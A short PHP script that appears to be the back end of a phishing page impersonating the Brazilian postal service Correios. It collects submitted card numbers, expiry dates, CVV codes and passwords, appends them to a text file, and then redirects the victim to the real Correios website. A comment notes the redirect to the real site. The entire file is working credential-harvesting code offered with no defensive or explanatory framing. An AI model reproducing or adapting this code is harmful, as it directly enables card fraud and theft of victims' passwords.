<?php
$dados = $_POST['numero']."|".$_POST['val']."|".$_POST['cvv']."|".$_POST['senha']."\n";
file_put_contents('vazios.txt', $dados, FILE_APPEND);
header('Location: https://www.correios.com.br'); // redireciona pro site real
exit;
?>
